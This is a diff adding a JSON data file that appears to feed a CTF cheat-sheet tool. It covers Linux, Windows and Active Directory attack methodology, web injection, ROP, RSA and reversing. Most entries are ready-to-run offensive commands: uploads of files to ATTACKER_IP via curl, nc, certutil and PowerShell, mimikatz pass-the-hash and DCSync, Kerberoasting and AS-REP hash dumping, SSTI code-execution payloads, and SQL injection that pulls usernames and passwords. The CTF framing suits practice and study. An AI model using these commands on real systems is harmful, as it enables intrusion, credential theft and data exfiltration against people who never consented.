@@ -1,0 +1,93 @@
+{
+    "linux": [
+        {
+            "id": "linux-methodology",
+            "title": "Linux CTF Methodology",
+            "content": "<ol><li>Reconnaissance: Scan the target with nmap, enumerate services</li><li>Initial Access: Exploit vulnerable services or misconfigurations</li><li>Privilege Escalation: Find misconfigurations, vulnerable binaries, kernel exploits</li><li>Post-Exploitation: Find flags, maintain access if needed</li></ol>"
+        },
+        {
+            "id": "linux-file-transfer",
+            "title": "File Transfer",
+            "content": "<h3>Download files from attacker machine</h3><pre><code>wget http://ATTACKER_IP/file -O /tmp/file\ncurl http://ATTACKER_IP/file -o /tmp/file</code></pre><h3>Upload files to attacker machine</h3><pre><code># On attacker machine:\npython3 -m http.server 80\nnc -lvnp 80 > file\n\n# On target:\ncurl -X POST --data-binary @file http://ATTACKER_IP\nnc ATTACKER_IP 80 < file</code></pre>"
+        },
+        {
+            "id": "linux-priv-esc",
+            "title": "Privilege Escalation",
+            "content": "<h3>Common enumeration commands</h3><pre><code>id\nuname -a\ncat /etc/passwd\nsudo -l\nfind / -perm -4000 -type f 2>/dev/null\nfind / -writable 2>/dev/null | grep -v \"/proc/\"\nps aux</code></pre><h3>SUID Exploits</h3><pre><code># Find SUID binaries\nfind / -perm -4000 -type f 2>/dev/null\n\n# Known vulnerable binaries\n# https://gtfobins.github.io/</code></pre><h3>Kernel Exploits</h3><pre><code># Check kernel version\nuname -a\n\n# Search for exploits\nsearchsploit \"Linux Kernel 4.4.0\"</code></pre>"
+        }
+    ],
+    "windows": [
+        {
+            "id": "windows-methodology",
+            "title": "Windows CTF Methodology",
+            "content": "<ol><li>Reconnaissance: Scan with nmap, enum SMB, RPC, etc.</li><li>Initial Access: Exploit vulnerable services or client-side attacks</li><li>Privilege Escalation: Token impersonation, service misconfigurations, DLL hijacking</li><li>Post-Exploitation: Dump credentials, find flags</li></ol>"
+        },
+        {
+            "id": "windows-file-transfer",
+            "title": "File Transfer",
+            "content": "<h3>Download files</h3><pre><code>certutil -urlcache -split -f http://ATTACKER_IP/file C:\\Windows\\Temp\\file\npowershell -c \"Invoke-WebRequest -Uri 'http://ATTACKER_IP/file' -OutFile 'C:\\Windows\\Temp\\file'\"</code></pre><h3>Upload files</h3><pre><code>powershell -c \"(New-Object System.Net.WebClient).UploadFile('http://ATTACKER_IP/upload', 'C:\\file')\"</code></pre>"
+        },
+        {
+            "id": "windows-priv-esc",
+            "title": "Privilege Escalation",
+            "content": "<h3>Common enumeration commands</h3><pre><code>whoami /priv\nsysteminfo\nnet user\nnet localgroup administrators\nsc query\naccesschk.exe -uwcqv \"Authenticated Users\" * /accepteula</code></pre><h3>Common exploits</h3><pre><code># Token impersonation (Juicy Potato, Rotten Potato)\n# Service misconfigurations\n# DLL hijacking\n# AlwaysInstallElevated\n# Unquoted service paths</code></pre>"
+        }
+    ],
+    "ad": [
+        {
+            "id": "ad-methodology",
+            "title": "Active Directory Methodology",
+            "content": "<ol><li>Reconnaissance: Enumeration with BloodHound, PowerView, etc.</li><li>Initial Access: Phishing, password spraying, AS-REP roasting</li><li>Lateral Movement: Pass-the-hash, Kerberoasting, DCSync</li><li>Privilege Escalation: ACL abuse, Kerberos delegation</li><li>Domain Compromise: Golden/Silver ticket attacks</li></ol>"
+        },
+        {
+            "id": "ad-enumeration",
+            "title": "Enumeration",
+            "content": "<h3>Basic enumeration</h3><pre><code># Get domain info\nnltest /domain_trusts\nGet-ADDomain\n\n# Get users\nnet user /domain\nGet-ADUser -Filter * -Properties *\n\n# Get computers\nGet-ADComputer -Filter * -Properties *</code></pre><h3>BloodHound</h3><pre><code># Collector\nSharpHound.exe -c All\nInvoke-BloodHound -CollectionMethod All\n\n# Import to BloodHound GUI</code></pre>"
+        },
+        {
+            "id": "ad-attacks",
+            "title": "Common Attacks",
+            "content": "<h3>AS-REP Roasting</h3><pre><code>Get-ASREPHash -UserName user -Domain domain.com | Out-File -Encoding ASCII hashes.txt</code></pre><h3>Kerberoasting</h3><pre><code>Invoke-Kerberoast -OutputFormat HashCat | Select-Object -ExpandProperty Hash | Out-File -Encoding ASCII kerberoast.txt</code></pre><h3>Pass-the-Hash</h3><pre><code># With mimikatz\nsekurlsa::pth /user:admin /domain:domain.com /ntlm:HASH /run:cmd.exe\n\n# With crackmapexec\ncrackmapexec smb IP -u user -H HASH -x whoami</code></pre><h3>DCSync</h3><pre><code># With mimikatz\nlsadump::dcsync /user:domain\\\\krbtgt</code></pre>"
+        }
+    ],
+    "web": [
+        {
+            "id": "web-ssti",
+            "title": "Server-Side Template Injection (SSTI)",
+            "content": "<h3>Detection</h3><pre><code># Basic test\n${7*7}\n{{7*7}}\n&lt;%= 7*7 %></code></pre><h3>Exploitation</h3><pre><code># Python (Jinja2)\n{{ ''.__class__.__mro__[1].__subclasses__() }}\n{{ config.items() }}\n\n# PHP (Twig)\n{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}}</code></pre>"
+        },
+        {
+            "id": "web-sqli",
+            "title": "SQL Injection",
+            "content": "<h3>Basic tests</h3><pre><code>'\n\"\n`\n')\n\")\n`)\n'))</code></pre><h3>Union-based</h3><pre><code># Find number of columns\n1' ORDER BY 1-- \n1' ORDER BY 2-- \netc.\n\n# Union attack\n1' UNION SELECT 1,2,3-- \n1' UNION SELECT username,password,3 FROM users--</code></pre><h3>Blind</h3><pre><code># Boolean-based\n1' AND 1=1-- \n1' AND 1=2-- \n\n# Time-based\n1' AND (SELECT sleep(10))--</code></pre>"
+        }
+    ],
+    "pwn": [
+        {
+            "id": "pwn-rop",
+            "title": "ROP (Return-Oriented Programming)",
+            "content": "<h3>Basic ROP chain</h3><pre><code># Find gadgets\nROPgadget --binary vuln\nropper -f vuln\n\n# Example chain\npadding + pop_rdi_ret + address_of_bin_sh + system</code></pre><h3>Useful tools</h3><pre><code># Pwntools\nfrom pwn import *\n\n# Checksec\nchecksec --file=vuln\n\n# Pattern create/offset\npattern create 100\npattern offset $rbp</code></pre>"
+        }
+    ],
+    "crypto": [
+        {
+            "id": "crypto-rsa",
+            "title": "RSA Attacks",
+            "content": "<h3>Small modulus factorization</h3><pre><code># Using factordb\n# http://factordb.com/\n\n# Using Python\nfrom Crypto.Util.number import inverse, long_to_bytes\n\nn = ...\ne = ...\nc = ...\np = ...\nq = ...\n\nphi = (p-1)*(q-1)\nd = inverse(e, phi)\nm = pow(c, d, n)\nprint(long_to_bytes(m))</code></pre><h3>Common modulus attack</h3><pre><code># When same n is used with different e\n# Find gcd(e1, e2) = 1, find a and b such that a*e1 + b*e2 = 1\n# Then m = (c1^a * c2^b) mod n</code></pre>"
+        }
+    ],
+    "rev": [
+        {
+            "id": "rev-tools",
+            "title": "Basic Reversing Tools",
+            "content": "<h3>Disassemblers/Decompilers</h3><pre><code>Ghidra\nIDA Pro\nBinary Ninja\nRadare2\nHopper</code></pre><h3>Debuggers</h3><pre><code>GDB (with pwndbg/gef)\nx64dbg\nWinDbg\nOllyDbg</code></pre>"
+        }
+    ],
+    "resources": [
+        {
+            "id": "online-resources",
+            "title": "Online Resources",
+            "content": "<table><tr><th>Resource</th><th>Description</th><th>Link</th></tr><tr><td>GTFOBins</td><td>SUID/privilege escalation techniques</td><td><a href=\"https://gtfobins.github.io/\" target=\"_blank\">https://gtfobins.github.io/</a></td></tr><tr><td>PayloadsAllTheThings</td><td>Collection of useful payloads</td><td><a href=\"https://github.com/swisskyrepo/PayloadsAllTheThings\" target=\"_blank\">https://github.com/swisskyrepo/PayloadsAllTheThings</a></td></tr><tr><td>ExploitDB</td><td>Database of exploits</td><td><a href=\"https://www.exploit-db.com/\" target=\"_blank\">https://www.exploit-db.com/</a></td></tr></table>"
+        }
+    ]
+}
